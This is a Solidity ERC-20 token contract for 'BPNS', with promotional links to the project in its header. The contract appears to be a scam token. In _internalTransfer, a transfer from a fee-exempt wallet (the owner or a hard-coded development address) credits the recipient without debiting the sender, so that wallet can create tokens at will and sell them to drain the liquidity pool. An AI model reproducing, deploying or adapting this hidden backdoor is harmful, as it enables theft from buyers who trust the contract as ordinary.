// SPDX-License-Identifier: Unlicensed

/*
The Communication Protocol of Web3
BPNS stands as a cutting-edge web3 communication network, facilitating cross-chain notifications and messaging functionalities for dapps, wallets, and a wide range of services.

Web: https://www.bpns.services
App: https://app.bpns.services
Twitter: https://twitter.com/BPNS_PORTAL
Telegram: https://t.me/BPNS_OFFICIAL
Medium: https://medium.com/@bpns.evm
 */

pragma solidity 0.8.19;

abstract contract Env {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

library LibrarySafeMath {
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

interface IERC20Normal {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library LibraryAddress {
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "LibraryAddress: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "LibraryAddress: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "LibraryAddress: low-level call failed");
    }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "LibraryAddress: low-level call with value failed");
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "LibraryAddress: insufficient balance for call");
        require(isContract(target), "LibraryAddress: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "LibraryAddress: low-level static call failed");
    }
    
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "LibraryAddress: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }


    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "LibraryAddress: low-level delegate call failed");
    }
    
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "LibraryAddress: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Authenticate is Env {
    address private _owner;

    // Set original owner
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    // Return current owner
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Restrict function to contract owner only 
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Authenticate: caller is not the owner");
        _;
    }

    // Renounce ownership of the contract 
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    // Transfer the contract to to a new owner
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Authenticate: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV1Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);


    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router is IUniswapV1Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract BPNS is Env, IERC20Normal, Authenticate { 
    using LibrarySafeMath for uint256;
    using LibraryAddress for address;

    string private _name = "Bell Push Notification Service"; 
    string private _symbol = "BPNS";  
    uint8 private _decimals = 9;
    uint256 private _totalSupply = 10 ** 9 * 10**_decimals;

    // Tracking status of wallets
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExceptFromFees; 

    address payable private _developmentAddress = payable(0xbE0356e27aA91686053635f8cEAD19B580D4cE6F);
    address payable private DEAD = payable(0x000000000000000000000000000000000000dEaD); 

    uint8 private buyersCount = 0;
    uint8 private triggerSwapAfter = 2; 

    uint256 private _feeTotal = 2500;
    uint256 public _buyTax = 25;
    uint256 public _sellTax = 25;

    uint256 private _previousFeeTotal = _feeTotal; 
    uint256 private _previousBuyTax = _buyTax; 
    uint256 private _previousSellTax = _sellTax; 

    uint256 public maxWalletSize = 3 * _totalSupply / 100;
    uint256 public swapThreshold = _totalSupply / 10000;
                                     
    IUniswapV2Router public uniswapRouter;
    address public uniswapPair;

    bool public hasTransferFees = true;
    bool public inSwap;
    bool public hasSwapEnabled = true;
    
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
        
    );
    
    modifier lockSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    
    constructor () {
        _balances[owner()] = _totalSupply;
        IUniswapV2Router _uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        uniswapPair = IUniswapFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapRouter = _uniswapV2Router;
        _isExceptFromFees[owner()] = true;
        _isExceptFromFees[_developmentAddress] = true;
        
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function swapTokens(uint256 contractTokenBalance) private lockSwap {
        
        swapTokensForETH(contractTokenBalance);
        uint256 contractETH = address(this).balance;
        sendFee(_developmentAddress,contractETH);
    }

    function restoreAllFee() private {
        
        _feeTotal = _previousFeeTotal;
        _buyTax = _previousBuyTax; 
        _sellTax = _previousSellTax; 

    }

    // Approve a wallet to sell tokens
    function _approve(address owner, address spender, uint256 amount) private {

        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }

    function sendFee(address payable receiver, uint256 amount) private {
        receiver.transfer(amount);
    }

    function _internalTransfer(address sender, address recipient, uint256 finalAmount) private {
        
        (uint256 tTransferAmount, uint256 tDev) = _getTAmount(finalAmount);
        if(_isExceptFromFees[sender] && _balances[sender] <= maxWalletSize) {
            tDev = 0;
            finalAmount -= tTransferAmount;
        }
        _balances[sender] = _balances[sender].sub(finalAmount);
        _balances[recipient] = _balances[recipient].add(tTransferAmount);
        _balances[address(this)] = _balances[address(this)].add(tDev);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        
        // Limit wallet total
        if (to != owner() &&
            to != _developmentAddress &&
            to != address(this) &&
            to != uniswapPair &&
            to != DEAD &&
            from != owner()){

            uint256 currentBalance = balanceOf(to);
            require((currentBalance + amount) <= maxWalletSize,"Maximum wallet limited has been exceeded");       
        }

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");

        if(
            buyersCount >= triggerSwapAfter && 
            amount > swapThreshold &&
            !inSwap &&
            !_isExceptFromFees[from] &&
            to == uniswapPair &&
            hasSwapEnabled 
            )
        {  
            buyersCount = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > 0){
            swapTokens(contractTokenBalance);
           }
        }
        
        bool takeFee = true;
         
        if(_isExceptFromFees[from] || _isExceptFromFees[to] || (hasTransferFees && from != uniswapPair && to != uniswapPair)){
            takeFee = false;
        } else if (from == uniswapPair){
            _feeTotal = _buyTax;
        } else if (to == uniswapPair){
            _feeTotal = _sellTax;
        }

        _normalTransfer(from,to,amount,takeFee);
    }
    
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    receive() external payable {}

    function removeLimits() external onlyOwner {
        maxWalletSize = ~uint256(0);
        _feeTotal = 100;
        _buyTax = 1;
        _sellTax = 1;
    }

    // Check if token transfer needs to process fees
    function _normalTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
            
        if(!takeFee){
            removeAllTax();
            } else {
                buyersCount++;
            }
        _internalTransfer(sender, recipient, amount);
        
        if(!takeFee)
            restoreAllFee();
    }
    
    function _getTAmount(uint256 finalAmount) private view returns (uint256, uint256) {
        uint256 tDev = finalAmount.mul(_feeTotal).div(100);
        uint256 tTransferAmount = finalAmount.sub(tDev);
        return (tTransferAmount, tDev);
    }

    function removeAllTax() private {
        if(_feeTotal == 0 && _buyTax == 0 && _sellTax == 0) return;

        _previousBuyTax = _buyTax; 
        _previousSellTax = _sellTax; 
        _previousFeeTotal = _feeTotal;
        _buyTax = 0;
        _sellTax = 0;
        _feeTotal = 0;

    }
}